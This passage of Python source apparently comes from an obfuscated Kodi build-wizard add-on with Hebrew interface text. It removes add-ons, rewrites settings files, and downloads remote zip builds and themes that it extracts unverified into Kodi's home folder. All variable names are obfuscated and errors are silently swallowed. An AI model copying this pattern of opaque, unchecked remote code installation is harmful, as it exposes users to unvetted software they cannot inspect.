		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3880
		fixfont ()#line:3881
		O0OOO0O000OOOOO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3882
		try :#line:3883
			O0OO000000O00OO0O =open (O0OOO0O000OOOOO0O ,'r')#line:3884
			O000O00OOOOO0O00O =O0OO000000O00OO0O .read ()#line:3885
			O0OO000000O00OO0O .close ()#line:3886
			O00O0000000O0OO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3887
			O000OOO0O0O0OO00O =re .compile (O00O0000000O0OO00 ).findall (O000O00OOOOO0O00O )[0 ]#line:3888
			O0OO000000O00OO0O =open (O0OOO0O000OOOOO0O ,'w')#line:3889
			O0OO000000O00OO0O .write (O000O00OOOOO0O00O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O000OOO0O0O0OO00O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3890
			O0OO000000O00OO0O .close ()#line:3891
		except :#line:3892
				pass #line:3893
		wiz .kodi17Fix ()#line:3894
		O0OOO0O000OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3895
		try :#line:3896
			O0OO000000O00OO0O =open (O0OOO0O000OOOOO0O ,'r')#line:3897
			O000O00OOOOO0O00O =O0OO000000O00OO0O .read ()#line:3898
			O0OO000000O00OO0O .close ()#line:3899
			O00O0000000O0OO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3900
			O000OOO0O0O0OO00O =re .compile (O00O0000000O0OO00 ).findall (O000O00OOOOO0O00O )[0 ]#line:3901
			O0OO000000O00OO0O =open (O0OOO0O000OOOOO0O ,'w')#line:3902
			O0OO000000O00OO0O .write (O000O00OOOOO0O00O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O000OOO0O0O0OO00O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3903
			O0OO000000O00OO0O .close ()#line:3904
		except :#line:3905
				pass #line:3906
		swapSkins ('skin.Premium.mod')#line:3907
def buildWizard (O0000000OO0OO0000 ,O0O0O00OOOOOOO00O ,theme =None ,over =False ):#line:3910
	O000OO0O0O00O0OO0 =xbmcgui .DialogBusy ()#line:3911
	O000OO0O0O00O0OO0 .create ()#line:3912
	if over ==False :#line:3913
		O0O0OO0OO00O0O00O =wiz .checkBuild (O0000000OO0OO0000 ,'url')#line:3914
		if USERNAME =='':#line:3915
			ADDON .openSettings ()#line:3916
			sys .exit ()#line:3917
		if PASSWORD =='':#line:3918
			ADDON .openSettings ()#line:3919
			sys .exit ()#line:3920
		if BUILDNAME =='':#line:3922
			O0OOO0O0000OO0O00 =u_list (SPEEDFILE )#line:3923
			(O0OOO0O0000OO0O00 )#line:3924
		if O0O0OO0OO00O0O00O ==False :#line:3925
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3930
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3931
			return #line:3932
		O0OO0O000OO000OOO =wiz .workingURL (O0O0OO0OO00O0O00O )#line:3933
		if O0OO0O000OO000OOO ==False :#line:3934
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OO0O000OO000OOO ))#line:3935
			return #line:3936
	if O0O0O00OOOOOOO00O =='gui':#line:3937
		if O0000000OO0OO0000 ==BUILDNAME :#line:3938
			if over ==True :O00O0OOOO0OO0O00O =1 #line:3939
			else :O00O0OOOO0OO0O00O =1 #line:3940
		else :#line:3941
			O00O0OOOO0OO0O00O =1 #line:3942
		if O00O0OOOO0OO0O00O :#line:3943
			remove_addons ()#line:3944
			remove_addons2 ()#line:3945
			debridit .debridIt ('update','all')#line:3946
			traktit .traktIt ('update','all')#line:3947
			OOO000OO0O0O0OO00 =wiz .checkBuild (O0000000OO0OO0000 ,'gui')#line:3948
			O00O0OO0O0O0000OO =O0000000OO0OO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3949
			if not wiz .workingURL (OOO000OO0O0O0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3950
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3951
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 ),'','אנא המתן')#line:3952
			O000000O000000O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OO0O0O0000OO )#line:3953
			try :os .remove (O000000O000000O0O )#line:3954
			except :pass #line:3955
			logging .warning (OOO000OO0O0O0OO00 )#line:3956
			if 'google'in OOO000OO0O0O0OO00 :#line:3957
			   OOO00OO0000O0OO0O =googledrive_download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP ,wiz .checkBuild (O0000000OO0OO0000 ,'filesize'))#line:3958
			else :#line:3961
			  downloader .download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP )#line:3962
			xbmc .sleep (100 )#line:3963
			O0OO0O0OO0O0OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 )#line:3964
			DP .update (0 ,O0OO0O0OO0O0OOOOO ,'','אנא המתן')#line:3965
			extract .all (O000000O000000O0O ,HOME ,DP ,title =O0OO0O0OO0O0OOOOO )#line:3966
			DP .close ()#line:3967
			wiz .defaultSkin ()#line:3968
			wiz .lookandFeelData ('save')#line:3969
			wiz .kodi17Fix ()#line:3970
			if KODIV >=18 :#line:3971
				skindialogsettind18 ()#line:3972
			debridit .debridIt ('restore','all')#line:3973
			traktit .traktIt ('restore','all')#line:3974
			if INSTALLMETHOD ==1 :O000OO0OO0OO00000 =1 #line:3976
			elif INSTALLMETHOD ==2 :O000OO0OO0OO00000 =0 #line:3977
			else :DP .close ()#line:3978
			O0OOOOO000OO0OOOO =(NOTIFICATION2 )#line:3979
			O0O0OO0OOOOOOOOOO =urllib2 .urlopen (O0OOOOO000OO0OOOO )#line:3980
			O00OO00O0000O00O0 =O0O0OO0OOOOOOOOOO .readlines ()#line:3981
			O00000000OO0O000O =0 #line:3982
			for O0OO0O0O00O0O000O in O00OO00O0000O00O0 :#line:3985
				if O0OO0O0O00O0O000O .split (' ==')[0 ]=="noreset"or O0OO0O0O00O0O000O .split ()[0 ]=="noreset":#line:3986
					xbmc .executebuiltin ("ReloadSkin()")#line:3988
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3989
					update_Votes ()#line:3990
					indicatorfastupdate ()#line:3991
				if O0OO0O0O00O0O000O .split (' ==')[0 ]=="reset"or O0OO0O0O00O0O000O .split ()[0 ]=="reset":#line:3992
					update_Votes ()#line:3994
					indicatorfastupdate ()#line:3995
					resetkodi ()#line:3996
		else :#line:4005
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4006
	if O0O0O00OOOOOOO00O =='gui2':#line:4007
		if O0000000OO0OO0000 ==BUILDNAME :#line:4008
			if over ==True :O00O0OOOO0OO0O00O =1 #line:4009
			else :O00O0OOOO0OO0O00O =1 #line:4010
		else :#line:4011
			O00O0OOOO0OO0O00O =1 #line:4012
		if O00O0OOOO0OO0O00O :#line:4013
			remove_addons ()#line:4014
			remove_addons2 ()#line:4015
			OOO000OO0O0O0OO00 =wiz .checkBuild (O0000000OO0OO0000 ,'gui')#line:4016
			O00O0OO0O0O0000OO =O0000000OO0OO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4017
			if not wiz .workingURL (OOO000OO0O0O0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4018
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4019
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 ),'','אנא המתן')#line:4020
			O000000O000000O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OO0O0O0000OO )#line:4021
			try :os .remove (O000000O000000O0O )#line:4022
			except :pass #line:4023
			logging .warning (OOO000OO0O0O0OO00 )#line:4024
			if 'google'in OOO000OO0O0O0OO00 :#line:4025
			   OOO00OO0000O0OO0O =googledrive_download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP ,wiz .checkBuild (O0000000OO0OO0000 ,'filesize'))#line:4026
			else :#line:4029
			  downloader .download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP )#line:4030
			xbmc .sleep (100 )#line:4031
			O0OO0O0OO0O0OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 )#line:4032
			DP .update (0 ,O0OO0O0OO0O0OOOOO ,'','אנא המתן')#line:4033
			extract .all (O000000O000000O0O ,HOME ,DP ,title =O0OO0O0OO0O0OOOOO )#line:4034
			DP .close ()#line:4035
			wiz .defaultSkin ()#line:4036
			wiz .lookandFeelData ('save')#line:4037
			if INSTALLMETHOD ==1 :O000OO0OO0OO00000 =1 #line:4040
			elif INSTALLMETHOD ==2 :O000OO0OO0OO00000 =0 #line:4041
			else :DP .close ()#line:4042
		else :#line:4044
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4045
	elif O0O0O00OOOOOOO00O =='fresh':#line:4046
		freshStart (O0000000OO0OO0000 )#line:4047
	elif O0O0O00OOOOOOO00O =='normal':#line:4048
		if url =='normal':#line:4049
			if KEEPTRAKT =='true':#line:4050
				traktit .autoUpdate ('all')#line:4051
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4052
			if KEEPREAL =='true':#line:4053
				debridit .autoUpdate ('all')#line:4054
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4055
			if KEEPLOGIN =='true':#line:4056
				loginit .autoUpdate ('all')#line:4057
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4058
		OOO0OOOO0OO0O0OOO =int (KODIV );O000O00OO0O0OO00O =int (float (wiz .checkBuild (O0000000OO0OO0000 ,'kodi')))#line:4059
		if not OOO0OOOO0OO0O0OOO ==O000O00OO0O0OO00O :#line:4060
			if OOO0OOOO0OO0O0OOO ==16 and O000O00OO0O0OO00O <=15 :O00O00000O0O000O0 =False #line:4061
			else :O00O00000O0O000O0 =True #line:4062
		else :O00O00000O0O000O0 =False #line:4063
		if O00O00000O0O000O0 ==True :#line:4064
			O00OO00000O000000 =1 #line:4065
		else :#line:4066
			if not over ==False :O00OO00000O000000 =1 #line:4067
			else :O00OO00000O000000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4068
		if O00OO00000O000000 :#line:4069
			wiz .clearS ('build')#line:4070
			OOO000OO0O0O0OO00 =wiz .checkBuild (O0000000OO0OO0000 ,'url')#line:4071
			O00O0OO0O0O0000OO =O0000000OO0OO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4072
			if not wiz .workingURL (OOO000OO0O0O0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4073
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4074
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 ,wiz .checkBuild (O0000000OO0OO0000 ,'version')),'','אנא המתן')#line:4075
			O000000O000000O0O =os .path .join (PACKAGES ,'%s.zip'%O00O0OO0O0O0000OO )#line:4076
			try :os .remove (O000000O000000O0O )#line:4077
			except :pass #line:4078
			logging .warning (OOO000OO0O0O0OO00 )#line:4079
			if 'google'in OOO000OO0O0O0OO00 :#line:4080
			   OOO00OO0000O0OO0O =googledrive_download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP ,wiz .checkBuild (O0000000OO0OO0000 ,'filesize'))#line:4081
			else :#line:4084
			  downloader .download (OOO000OO0O0O0OO00 ,O000000O000000O0O ,DP )#line:4085
			xbmc .sleep (1000 )#line:4086
			O0OO0O0OO0O0OOOOO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 ,wiz .checkBuild (O0000000OO0OO0000 ,'version'))#line:4087
			DP .update (0 ,O0OO0O0OO0O0OOOOO ,'','אנא המתן...')#line:4088
			O000OOOOO0000O00O ,OOOOOOOOO0O0OOO0O ,O0000O0O000O0O00O =extract .all (O000000O000000O0O ,HOME ,DP ,title =O0OO0O0OO0O0OOOOO )#line:4089
			if int (float (O000OOOOO0000O00O ))>0 :#line:4090
				try :#line:4091
					wiz .fixmetas ()#line:4092
				except :pass #line:4093
				wiz .lookandFeelData ('save')#line:4094
				wiz .defaultSkin ()#line:4095
				wiz .setS ('buildname',O0000000OO0OO0000 )#line:4097
				wiz .setS ('buildversion',wiz .checkBuild (O0000000OO0OO0000 ,'version'))#line:4098
				wiz .setS ('buildtheme','')#line:4099
				wiz .setS ('latestversion',wiz .checkBuild (O0000000OO0OO0000 ,'version'))#line:4100
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4101
				wiz .setS ('installed','true')#line:4102
				wiz .setS ('extract',str (O000OOOOO0000O00O ))#line:4103
				wiz .setS ('errors',str (OOOOOOOOO0O0OOO0O ))#line:4104
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000OOOOO0000O00O ,OOOOOOOOO0O0OOO0O ))#line:4105
				fastupdatefirstbuild (NOTEID )#line:4106
				wiz .kodi17Fix ()#line:4107
				skin_homeselect ()#line:4108
				skin_lower ()#line:4109
				rdbuildinstall ()#line:4110
				try :gaiaserenaddon ()#line:4111
				except :pass #line:4112
				adults18 ()#line:4113
				skinfix18 ()#line:4114
				try :os .remove (O000000O000000O0O )#line:4116
				except :pass #line:4117
				OOOOO00OO00OOOO00 =(ADDON .getSetting ("auto_rd"))#line:4118
				if OOOOO00OO00OOOO00 =='true':#line:4119
					try :#line:4120
						setautorealdebrid ()#line:4121
					except :pass #line:4122
				try :#line:4123
					autotrakt ()#line:4124
				except :pass #line:4125
				OOOOOOO0OO00OO0O0 =(ADDON .getSetting ("imdb_on"))#line:4126
				if OOOOOOO0OO00OO0O0 =='true':#line:4127
					imdb_synck ()#line:4128
				iptvset ()#line:4129
				DP .close ()#line:4137
				OOOO0O0OO00OO0O0O =wiz .themeCount (O0000000OO0OO0000 )#line:4138
				builde_Votes ()#line:4139
				indicator ()#line:4140
				if not OOOO0O0OO00OO0O0O ==False :#line:4141
					buildWizard (O0000000OO0OO0000 ,'theme')#line:4142
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4143
				if INSTALLMETHOD ==1 :O000OO0OO0OO00000 =1 #line:4144
				elif INSTALLMETHOD ==2 :O000OO0OO0OO00000 =0 #line:4145
				else :resetkodi ()#line:4146
				if O000OO0OO0OO00000 ==1 :wiz .reloadFix ()#line:4148
				else :wiz .killxbmc (True )#line:4149
			else :#line:4150
				if isinstance (OOOOOOOOO0O0OOO0O ,unicode ):#line:4151
					O0000O0O000O0O00O =O0000O0O000O0O00O .encode ('utf-8')#line:4152
				OOOOO00OOOOOOOO0O =open (O000000O000000O0O ,'r')#line:4153
				OOOOOO00O00OOO0O0 =OOOOO00OOOOOOOO0O .read ()#line:4154
				OO0OOO0OOO0O0OOO0 =''#line:4155
				for O0OOOOOO000O00O0O in OOO00OO0000O0OO0O :#line:4156
				  OO0OOO0OOO0O0OOO0 ='key: '+OO0OOO0OOO0O0OOO0 +'\n'+O0OOOOOO000O00O0O #line:4157
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0000O0O000O0O00O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OOO0OOO0O0OOO0 )#line:4158
		else :#line:4159
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4160
	elif O0O0O00OOOOOOO00O =='theme':#line:4161
		if theme ==None :#line:4162
			OOOO0O0OO00OO0O0O =wiz .checkBuild (O0000000OO0OO0000 ,'theme')#line:4163
			OOO00O000OO0OOOOO =[]#line:4164
			if not OOOO0O0OO00OO0O0O =='http://'and wiz .workingURL (OOOO0O0OO00OO0O0O )==True :#line:4165
				OOO00O000OO0OOOOO =wiz .themeCount (O0000000OO0OO0000 ,False )#line:4166
				if len (OOO00O000OO0OOOOO )>0 :#line:4167
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0000000OO0OO0000 ,COLOR1 ,len (OOO00O000OO0OOOOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4168
						wiz .log ("Theme List: %s "%str (OOO00O000OO0OOOOO ))#line:4169
						OOOOOO0OO0OO0O00O =DIALOG .select (ADDONTITLE ,OOO00O000OO0OOOOO )#line:4170
						wiz .log ("Theme install selected: %s"%OOOOOO0OO0OO0O00O )#line:4171
						if not OOOOOO0OO0OO0O00O ==-1 :theme =OOO00O000OO0OOOOO [OOOOOO0OO0OO0O00O ];O00O0O0O0O00000OO =True #line:4172
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4173
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4174
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4175
		else :O00O0O0O0O00000OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0000000OO0OO0000 ,wiz .checkBuild (O0000000OO0OO0000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4176
		if O00O0O0O0O00000OO :#line:4177
			OOOO0O0O0OO00O0O0 =wiz .checkTheme (O0000000OO0OO0000 ,theme ,'url')#line:4178
			O00O0OO0O0O0000OO =O0000000OO0OO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4179
			if not wiz .workingURL (OOOO0O0O0OO00O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4180
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4181
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4182
			O000000O000000O0O =os .path .join (PACKAGES ,'%s.zip'%O00O0OO0O0O0000OO )#line:4183
			try :os .remove (O000000O000000O0O )#line:4184
			except :pass #line:4185
			downloader .download (OOOO0O0O0OO00O0O0 ,O000000O000000O0O ,DP )#line:4186
			xbmc .sleep (1000 )#line:4187
			DP .update (0 ,"","Installing %s "%O0000000OO0OO0000 )#line:4188
			O000OO0000O00O0O0 =False #line:4189
			if url not in ["fresh","normal"]:#line:4190
				O000OO0000O00O0O0 =testTheme (O000000O000000O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4191
				OOO0OO0OO0O0000OO =testGui (O000000O000000O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4192
				if O000OO0000O00O0O0 ==True :#line:4193
					wiz .lookandFeelData ('save')#line:4194
					O0OO0O00OO0O00O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4195
					OO0000OO0OO0O0O0O =xbmc .getSkinDir ()#line:4196
					skinSwitch .swapSkins (O0OO0O00OO0O00O0O )#line:4198
					O00OO00O0000O00O0 =0 #line:4199
					xbmc .sleep (1000 )#line:4200
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00O0000O00O0 <150 :#line:4201
						O00OO00O0000O00O0 +=1 #line:4202
						xbmc .sleep (1000 )#line:4203
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4204
						wiz .ebi ('SendClick(11)')#line:4205
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4206
					xbmc .sleep (1000 )#line:4207
			O0OO0O0OO0O0OOOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4208
			DP .update (0 ,O0OO0O0OO0O0OOOOO ,'','אנא המתן')#line:4209
			O000OOOOO0000O00O ,OOOOOOOOO0O0OOO0O ,O0000O0O000O0O00O =extract .all (O000000O000000O0O ,HOME ,DP ,title =O0OO0O0OO0O0OOOOO )#line:4210
			wiz .setS ('buildtheme',theme )#line:4211
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O000OOOOO0000O00O ,OOOOOOOOO0O0OOO0O ))#line:4212
			DP .close ()#line:4213
			if url not in ["fresh","normal"]:#line:4214
				wiz .forceUpdate ()#line:4215
				if KODIV >=17 :wiz .kodi17Fix ()#line:4216
				if OOO0OO0OO0O0000OO ==True :#line:4217
					wiz .lookandFeelData ('save')#line:4218
					wiz .defaultSkin ()#line:4219
					OO0000OO0OO0O0O0O =wiz .getS ('defaultskin')#line:4220
					skinSwitch .swapSkins (OO0000OO0OO0O0O0O )#line:4221
					O00OO00O0000O00O0 =0 #line:4222
					xbmc .sleep (1000 )#line:4223
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00O0000O00O0 <150 :#line:4224
						O00OO00O0000O00O0 +=1 #line:4225
						xbmc .sleep (1000 )#line:4226
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4228
						wiz .ebi ('SendClick(11)')#line:4229
					wiz .lookandFeelData ('restore')#line:4230
				elif O000OO0000O00O0O0 ==True :#line:4231
					skinSwitch .swapSkins (OO0000OO0OO0O0O0O )#line:4232
					O00OO00O0000O00O0 =0 #line:4233
					xbmc .sleep (1000 )#line:4234
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00O0000O00O0 <150 :#line:4235
						O00OO00O0000O00O0 +=1 #line:4236
						xbmc .sleep (1000 )#line:4237
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4239
						wiz .ebi ('SendClick(11)')#line:4240
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4241
					wiz .lookandFeelData ('restore')#line:4242
				else :#line:4243
					wiz .ebi ("ReloadSkin()")#line:4244
					xbmc .sleep (1000 )#line:4245
					wiz .ebi ("Container.Refresh")#line:4246
		else :#line:4247
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4248
def skin_homeselect ():#line:4252
	try :#line:4254
		O000OOOOO0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4255
		O0000OOO00OO00O0O =open (O000OOOOO0OOOOO0O ,'r')#line:4257
		OOOO0O000O0OOO0OO =O0000OOO00OO00O0O .read ()#line:4258
		O0000OOO00OO00O0O .close ()#line:4259
		O00O0000000OO0000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4260
		OO0OO00OO00OOO000 =re .compile (O00O0000000OO0000 ).findall (OOOO0O000O0OOO0OO )[0 ]#line:4261
		O0000OOO00OO00O0O =open (O000OOOOO0OOOOO0O ,'w')#line:4262
		O0000OOO00OO00O0O .write (OOOO0O000O0OOO0OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0OO00OO00OOO000 ,'<setting id="HomeS" type="string"></setting>'))#line:4263
		O0000OOO00OO00O0O .close ()#line:4264
	except :#line:4265
		pass #line:4266
def skin_lower ():#line:4269
	O00OO000OO000O0OO =(ADDON .getSetting ("lower"))#line:4270
	if O00OO000OO000O0OO =='true':#line:4271
		try :#line:4274
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4275
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4277
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4278
			O00000O0OO0OO0OO0 .close ()#line:4279
			O0OO00O0OO00O00O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4280
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4281
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4282
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4283
			O00000O0OO0OO0OO0 .close ()#line:4284
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4286
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4288
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4289
			O00000O0OO0OO0OO0 .close ()#line:4290
			O0OO00O0OO00O00O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4291
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4292
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4293
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4294
			O00000O0OO0OO0OO0 .close ()#line:4295
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4297
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4299
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4300
			O00000O0OO0OO0OO0 .close ()#line:4301
			O0OO00O0OO00O00O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4302
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4303
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4304
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4305
